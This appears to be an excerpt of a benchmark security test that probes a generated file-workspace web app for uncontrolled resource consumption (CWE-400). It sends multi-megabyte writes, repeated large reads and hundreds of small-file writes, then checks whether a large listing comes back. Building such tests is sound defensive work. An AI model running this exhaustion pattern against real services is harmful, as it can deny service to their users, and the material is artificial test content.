...
def sec_test_uncontrolled_resource_consumption(
    ...
    try:
        app.logger.info(
            "Starting CWE-400 (Uncontrolled Resource Consumption) exploit PoC"
        )

        # Workspace selection (do not leak marker in logs; use independent UUID)
        workspace = f"ws-{uuid.uuid4().hex[:8]}"
        large_dir = "large"
        large_file = f"{large_dir}/large.txt"
        bulk_dir = "bulk"

        # Prepare a unique marker and large content
        marker = generate_marker()  # do not log or print
        # Try progressively larger payloads to keep the PoC robust across environments
        candidate_sizes = [8 * 1024 * 1024, 4 * 1024 * 1024]  # 8 MiB then 4 MiB
        large_size = None
        wrote_bytes = None

        for size in candidate_sizes:
            fill_len = max(0, size - 2 * len(marker))
            content = marker + ("A" * fill_len) + marker
            app.logger.info(
                "Attempting large write of %d bytes to %s/%s",
                len(content),
                workspace,
                large_file,
            )
            ...
            bw = _write_request_no_body_log(app, payload_write, timeout=30.0)
            if isinstance(bw, int) and bw == len(content):
                app.logger.info("Large write succeeded: %d bytes", bw)
                large_size = len(content)
                wrote_bytes = bw
                break
            else:
                app.logger.warning(
                    "Large write attempt failed or mismatched (bytesWritten=%s), trying smaller size",
                    bw,
                )

        if large_size is None or wrote_bytes is None:
            app.logger.error(
                "Failed to perform any large write; cannot demonstrate unbounded request handling."
            )
            return findings  # empty

        # Verify file exists on disk (sanity check; avoid logging content)
        try:
            server_path = f"{app.env.workdir}/{workspace}/{large_file}"
            on_disk = load_file_from_docker(app.container_id, server_path)
            if isinstance(on_disk, (bytes, bytearray)) and len(on_disk) == large_size:
                app.logger.info(
                    "Verified on-disk large file size: %d bytes", len(on_disk)
                )
            else:
                app.logger.warning("On-disk verification size mismatch or unavailable.")
        except Exception as e:
            app.logger.warning("On-disk verification failed (non-fatal): %s", e)

        # Large read to force unbounded response serialization
        payload_read = {
            "action": "read",
            "workspace": workspace,
            "path": large_file,
        }
        app.logger.info("Performing large read from %s/%s", workspace, large_file)
        content_read = _read_request_with_timeout(app, payload_read, timeout=30.0)
        if not isinstance(content_read, str) or len(content_read) != large_size:
            app.logger.error(
                "Large read failed or returned unexpected size (got %s)",
                None if content_read is None else len(content_read),
            )
            return findings  # empty
        # Avoid keeping large content in memory
        del content_read

        # Amplify with a couple more large reads (without retaining content)
        for j in range(2):
            app.logger.info("Amplification read #%d", j + 1)
            _ = _read_request_with_timeout(app, payload_read, timeout=30.0)

        # Create many small files to inflate directory listing workload
        small_content = f"ping:{marker}".encode("utf-8")[:0].decode(
            "utf-8"
        )  # ensure string
        # Use a fixed-size content to avoid marker leaks in logs; content kept tiny
        small_content = "x" * 64
        small_file_count = 800  # Balanced for speed and effect
        app.logger.info(
            "Creating %d small files under %s/%s", small_file_count, workspace, bulk_dir
        )
        created = _bulk_small_writes(
            app,
            workspace=workspace,
            dir_name=bulk_dir,
        ...
        app.logger.info("Small files created: %d/%d", created, small_file_count)

        # List the populated directory to produce a large JSON array
        payload_list_bulk = {
            "action": "list",
            "workspace": workspace,
            "path": bulk_dir,
        }
        files_list = _list_request_no_body_log(app, payload_list_bulk, timeout=15.0)
        if files_list is None:
            # Fallback: list the root and filter for bulk/ prefix
            app.logger.warning("Listing '%s' failed; falling back to '.'", bulk_dir)
            payload_list_root = {
                "action": "list",
                "workspace": workspace,
                "path": ".",
            }
            files_list = _list_request_no_body_log(app, payload_list_root, timeout=15.0)
            if files_list is not None:
                files_list = [
                    f
                    for f in files_list
                    if f.startswith(f"{bulk_dir}/") or f.startswith(bulk_dir)
                ]
        listed_count = len(files_list) if files_list is not None else 0
        app.logger.info("List returned %d entries", listed_count)

        # Decide success: large write+read completed with expected sizes and list is large
        success = (
            isinstance(wrote_bytes, int)
            and wrote_bytes == large_size
            and listed_count
            >= int(0.9 * small_file_count)  # tolerate minor creation failures
        )
        if success:
            app.logger.info(
                "CWE-400 exploitation conditions met: unbounded write/read/list behavior observed."
            )
            findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)
        else:
            app.logger.warning(
                "Exploit conditions not fully met (wrote=%s, large_size=%s, listed=%s)",
                wrote_bytes,
                large_size,
                listed_count,
            )
        ...
        app.logger.exception("Exploit PoC failed with exception: %s", e)
        return findings
